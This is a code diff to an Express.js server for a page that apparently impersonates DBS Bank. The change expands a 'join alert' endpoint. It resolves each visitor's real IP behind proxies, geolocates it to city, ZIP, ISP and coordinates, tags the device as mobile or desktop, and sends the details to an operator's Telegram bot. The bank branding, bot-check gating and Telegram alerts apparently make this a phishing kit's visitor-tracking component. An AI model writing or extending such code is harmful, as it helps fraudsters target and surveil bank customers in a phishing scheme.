@@ -70,29 +70,38 @@ app.post('/verify-turnstile', async (req, res) => {
 
 
 
-
 // ─── TELEGRAM JOIN ALERT ────────────────────────────────────────────
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 function getClientInfo(req) {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim()
+    let ip = req.headers['x-forwarded-for']?.split(',')[0].trim()
         || req.headers['x-real-ip']
         || req.connection.remoteAddress
         || req.socket.remoteAddress
         || 'Unknown';
+
+    if (ip === '127.0.0.1') {
+        ip = req.headers['cf-connecting-ip']
+            || req.headers['x-forwarded-for']?.split(',')[0].trim()
+            || ip;
+    }
+
     const userAgent = req.headers['user-agent'] || 'Unknown';
     return { ip, userAgent };
 }
 
-async function getCountry(ip) {
-    if (ip === 'Unknown' || ip === '127.0.0.1') return 'Local';
+async function getGeoInfo(ip) {
+    if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
+        return { country: 'Local', city: 'Local' };
+    }
     try {
-        const r = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,country`);
-        const d = await r.json();
-        return d.country || d.countryCode || 'Unknown';
+        const r = await fetch(
+            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
+        );
+        return await r.json();
     } catch {
-        return 'Unknown';
+        return { country: 'Unknown', city: 'Unknown' };
     }
 }
 
@@ -115,20 +124,32 @@ async function sendTelegram(message) {
 
 app.post('/api/join-alert', async (req, res) => {
     const { ip, userAgent } = getClientInfo(req);
-    const country = await getCountry(ip);
-    const page = req.body?.page || 'DBS Bank';
+    const geo = await getGeoInfo(ip);
+    const page = req.body?.page || 'VISITED DBS BANK';
 
-    sendTelegram(`
+    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|webOS|Mobile/i.test(userAgent);
+
+    const message = `
 🏦 <b>AFA MD, SOMEONE ${page.toUpperCase()}</b>
 
-🌍 Country: <code>${country}</code>
 🌐 IP: <code>${ip}</code>
-📱 User-Agent: <code>${userAgent}</code>
-🕒 Time: ${new Date().toLocaleString()}
-    `.trim());
+🌍 Country: <code>${geo.country || 'Unknown'}</code>
+🏙️ City: <code>${geo.city || 'Unknown'}</code>
+📍 Region: <code>${geo.regionName || 'Unknown'}</code>
+📮 ZIP: <code>${geo.zip || 'Unknown'}</code>
+🌐 ISP: <code>${geo.isp || 'Unknown'}</code>
+🏢 Org: <code>${geo.org || 'Unknown'}</code>
+🕒 Timezone: <code>${geo.timezone || 'Unknown'}</code>
+🗺️ Lat/Lon: <code>${geo.lat}, ${geo.lon}</code>
 
+📱 User-Agent: <code>${userAgent}</code>
+${isMobile ? '⚠️ MOBILE' : '✅ DESKTOP'}
+📅 Time: ${new Date().toLocaleString()}
+    `.trim();
+
+    sendTelegram(message);
     res.json({ ok: true });
-});
+}); 
 
 
 
